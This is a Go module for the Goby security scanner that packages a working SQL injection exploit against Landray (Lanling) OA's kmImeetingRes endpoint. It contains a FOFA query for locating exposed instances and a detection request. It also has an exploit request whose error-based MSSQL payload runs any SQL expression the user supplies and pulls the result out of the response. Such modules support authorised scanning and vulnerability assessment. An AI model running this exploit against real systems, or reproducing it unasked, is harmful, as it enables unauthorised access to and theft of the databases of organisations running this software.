package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Lanling OA kmimeetingres SQL injection vulnerability",
    "Description": "<p><a href=\"https://fanyi.baidu.com/translate?aldtype=16047&amp;query=Landray+OA+is+the+first+domestic+enterprise+to+research+knowledge+management+and+promote+the+construction+of+knowledge+platform%2C+providing+solutions+for+customers.+Lanling+Smart+Collaboration+Platform+has+an+arbitrary+file+reading+vulnerability.+Attackers+can+use+vulnerabilities+to+obtain+sensitive+information.&amp;keyfrom=baidu&amp;smartresult=dict&amp;lang=auto2zh###\"></a><a></a></p><p></p><p>Lanling OA office system is an OA office tool for instant office communication.</p><p>There is a SQL injection vulnerability in the digital OA of Shenzhen Lanling Software Co., Ltd., which can be used by attackers to obtain sensitive database information.</p>",
    "Product": "Landray OA system",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2022-03-31",
    "Author": "xiaodan",
    "FofaQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "GobyQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "Level": "3",
    "Impact": "<p>There is a SQL injection vulnerability in the digital OA of Shenzhen Lanling Software Co., Ltd., which can be used by an attacker to obtain sensitive database information.</p>",
    "Recommendation": "<p>Currently, the official security patch has not been released. Please pay attention to the manufacturer's update.http://www.landray.com.cn/</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "DB_NAME()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/ui/extend/varkind/custom.jsp",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept-Encoding": "gzip, deflate",
                    "Cookie": "JSESSIONID=99376761BDEF37E18D3F52A3AC156A55"
                },
                "data_type": "text",
                "data": "var=%7B%22body%22%3A%7B%22file%22%3A%22%2Fkm%2Fimeeting%2Fkm_imeeting_res%2FkmImeetingRes.do%3FcontentType=json%22%7D%7D&method=listUse&orderby=1%20,(SELECT%207903%20WHERE%207903=CONVERT(INT,(SELECT%20CHAR(113)%2BCHAR(120)%2BCHAR(98)%2BCHAR(98)%2BCHAR(113)%2BCHAR(113)%2BCHAR(112)%2BCHAR(107)%2BCHAR(118)%2BCHAR(113))))&ordertype=down&s_ajax=true"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "qxbbqqpkvq",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/ui/extend/varkind/custom.jsp",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept-Encoding": "gzip, deflate",
                    "Cookie": "JSESSIONID=99376761BDEF37E18D3F52A3AC156A55"
                },
                "data_type": "text",
                "data": "var=%7B%22body%22%3A%7B%22file%22%3A%22%2Fkm%2Fimeeting%2Fkm_imeeting_res%2FkmImeetingRes.do%3FcontentType=json%22%7D%7D&method=listUse&orderby=1%20%2C%28SELECT%207903%20WHERE%207903%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28{{{sql}}}%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%29&ordertype=down&s_ajax=true"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|'qxbbq(.*?)qpkvq'"
            ]
        }
    ],
    "Tags": [
        "Information technology application innovation industry",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "5",
    "Translation": {
        "CN": {
            "Name": "蓝凌OA kmImeetingRes sql注入漏洞",
            "Product": "Landray-OA系统",
            "Description": "<p><span style=\"color: rgb(62, 62, 62); font-size: 14px;\"><span style=\"color: rgb(52, 58, 64); font-size: 16px;\"><span style=\"color: rgb(52, 58, 64); font-size: 16px;\">蓝凌oa办公系统是用于即时办公通讯的oa办公工具。</span></span></span></p><p><span style=\"color: rgb(62, 62, 62); font-size: 14px;\"><span style=\"color: rgb(52, 58, 64); font-size: 16px;\">深圳市蓝凌软件股份有限公司数字OA</span>存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。</span></p>",
            "Recommendation": "<p>目前官方未发布安全补丁，请关注厂商更新。<span style=\"color: rgb(52, 58, 64); font-size: 16px;\"><a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a></span><a href=\"https://www.chanjet.com/\" target=\"_blank\"></a><br><br></p>",
            "Impact": "<p><span style=\"color: rgb(52, 58, 64); font-size: 16px;\">深圳市蓝凌软件股份有限公司数字OA</span><span style=\"color: rgb(62, 62, 62); font-size: 14px;\">存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。</span><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "信创",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Lanling OA kmimeetingres SQL injection vulnerability",
            "Product": "Landray OA system",
            "Description": "<p><a href=\"https://fanyi.baidu.com/translate?aldtype=16047&amp;query=Landray+OA+is+the+first+domestic+enterprise+to+research+knowledge+management+and+promote+the+construction+of+knowledge+platform%2C+providing+solutions+for+customers.+Lanling+Smart+Collaboration+Platform+has+an+arbitrary+file+reading+vulnerability.+Attackers+can+use+vulnerabilities+to+obtain+sensitive+information.&amp;keyfrom=baidu&amp;smartresult=dict&amp;lang=auto2zh###\"></a><a></a></p><p></p><p>Lanling OA office system is an OA office tool for instant office communication.</p><p>There is a SQL injection vulnerability in the digital OA of Shenzhen Lanling Software Co., Ltd., which can be used by attackers to obtain sensitive database information.</p>",
            "Recommendation": "<p><span style=\"color: rgb(0, 0, 0);\"><span style=\"font-size: small;\">Currently, the official security patch has not been released. Please pay attention to the manufacturer's update.<span style=\"color: rgb(52, 58, 64);\"><a href=\"http://www.landray.com.cn/\">http://www.landray.com.cn/</a></span></span></span><br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in the digital OA of Shenzhen Lanling Software Co., Ltd., which can be used by an attacker to obtain sensitive database information.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "Information technology application innovation industry",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10706"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}